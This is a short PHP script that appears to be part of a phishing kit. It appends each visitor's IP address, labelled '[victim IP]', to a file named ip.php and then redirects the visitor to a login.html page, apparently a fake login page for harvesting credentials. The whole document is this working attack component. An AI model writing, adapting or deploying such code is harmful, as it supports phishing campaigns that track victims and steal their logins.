<?php
file_put_contents("ip.php", "[victim IP] " . getenv("REMOTE_ADDR") . "\n", FILE_APPEND);
header('Location: login.html');
exit();
?>
